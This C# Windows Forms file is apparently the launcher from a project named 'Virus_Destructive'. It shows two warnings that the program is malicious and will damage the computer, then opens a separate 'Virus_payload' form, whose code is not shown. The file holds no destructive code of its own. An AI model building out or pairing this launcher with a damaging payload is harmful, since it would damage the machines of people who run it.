using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Virus_Destructive
{
    public partial class Virus : Form
    {
        public Virus()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
        }

        private void Virus_Load(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you want to run this program? This is malicious software. Click Yes to continue", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                Last_Warning();
            }
        }
        public void Last_Warning()
        {
            if (MessageBox.Show("THIS IS THE LAST WARNING!!! IF YOU RUN THIS PROGRAM, YOUR COMPUTER GET A LOT OF DAMAGE!!!", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                go_to_payload();
            }
        }

        public void go_to_payload()
        {
            this.Hide();
            var NewForm = new Virus_payload(); //lunch virus
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
